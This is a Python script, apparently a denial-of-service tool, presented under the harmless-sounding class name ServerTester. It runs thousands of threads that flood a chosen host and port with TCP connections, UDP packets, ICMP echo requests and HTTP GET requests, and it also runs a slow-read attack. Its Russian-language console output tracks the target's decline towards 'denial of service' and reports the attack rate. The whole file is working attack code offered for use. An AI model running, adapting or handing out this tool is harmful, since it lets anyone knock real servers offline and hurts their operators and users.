import threading
import time
import random
import json
import socket
import struct
import signal
from concurrent.futures import ThreadPoolExecutor

class ServerTester:
    def __init__(self, target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
        self.target = target
        self.use_user_agent = use_user_agent
        self.use_cookie = use_cookie
        self.use_bypass = use_bypass
        self.use_proxy = use_proxy
        self.success_count = 0
        self.error_count = 0
        self.running = False
        self.user_agents = []
        self.proxies = []
        self.lock = threading.Lock()
        self.host, self.port = self.parse_target(target)
        self.load_resources()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        print("\n\n\033[91mОстанавливаю атаку...\033[0m")
        self.running = False

    def parse_target(self, target):
        if ':' in target:
            host, port = target.split(':', 1)
            port = int(port)
        else:
            host = target
            port = 80
        return host, port

    def load_resources(self):
        try:
            with open('user.json', 'r') as f:
                data = json.load(f)
                self.user_agents = [item.get('user_agent', '') for item in data if item.get('user_agent')]
        except:
            self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
        try:
            with open('proxy.json', 'r') as f:
                self.proxies = json.load(f)
        except:
            self.proxies = []

    def get_random_user_agent(self):
        if self.use_user_agent and self.user_agents:
            return random.choice(self.user_agents)
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    def tcp_syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((self.host, self.port))
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                for _ in range(100):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def icmp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                sock.sendto(packet, (self.host, self.port))
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((self.host, self.port))
                http_request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {self.get_random_user_agent()}\r\n\r\n"
                sock.send(http_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def slow_read_attack(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.host, self.port))
                http_request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {self.get_random_user_agent()}\r\n"
                sock.send(http_request.encode())
                start_time = time.time()
                while self.running and time.time() - start_time < 30:
                    try:
                        data = sock.recv(1)
                        if not data:
                            break
                        time.sleep(1)
                    except:
                        break
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def status_worker(self):
        last_success, last_error, start_time = 0, 0, time.time()
        while self.running:
            current_time = time.time()
            elapsed_time = current_time - start_time
            current_success, current_error = self.success_count, self.error_count
            success_rate, error_rate = current_success - last_success, current_error - last_error
            total_requests = success_rate + error_rate
            total_rps = (current_success + current_error) / elapsed_time if elapsed_time > 0 else 0
            if total_requests > 0:
                success_percent = (success_rate / total_requests) * 100
            else:
                success_percent = 0
            if success_percent >= 80:
                status = "\033[92mХорошее\033[0m"
            elif success_percent >= 50:
                status = "\033[93mНормальное\033[0m"
            elif success_percent >= 20:
                status = "\033[91mПлохое\033[0m"
            else:
                status = "\033[31mОтказ в обслуживании\033[0m"
            print(f"\r\033[94mУспешно: {self.success_count}\033[0m | \033[91mОшибки: {self.error_count}\033[0m | \033[96mСтатус: {status}\033[0m | \033[95mRPS: {total_rps:,.0f}\033[0m", end="", flush=True)
            last_success, last_error = current_success, current_error
            time.sleep(0.1)

    def start_attack(self):
        print("\033[91mАтака началась...\033[0m")
        print("\033[96mКомбинированная атака: TCP SYN + UDP + ICMP + HTTP + SLOW READ\033[0m")
        self.running = True
        attack_start_time = time.time()
        status_thread = threading.Thread(target=self.status_worker)
        status_thread.daemon = True
        status_thread.start()
        threads = []
        attack_methods = [self.tcp_syn_flood, self.udp_flood, self.icmp_flood, self.http_flood, self.slow_read_attack]
        for method in attack_methods:
            for _ in range(1000):
                thread = threading.Thread(target=method)
                thread.daemon = True
                threads.append(thread)
                thread.start()
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        attack_duration = time.time() - attack_start_time
        print("\n\n\033[92mАтака остановлена!\033[0m")
        print("\033[94mИтоговая статистика:\033[0m")
        print(f"\033[96m   Успешных запросов: {self.success_count:,}\033[0m")
        print(f"\033[91m   Ошибок: {self.error_count:,}\033[0m")
        print(f"\033[93m   Всего запросов: {self.success_count + self.error_count:,}\033[0m")
        print(f"\033[95m   Максимальный RPS: {(self.success_count + self.error_count) / attack_duration:,.0f}\033[0m")

def test_server(target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
    tester = ServerTester(target, use_user_agent, use_cookie, use_bypass, use_proxy)
    tester.start_attack()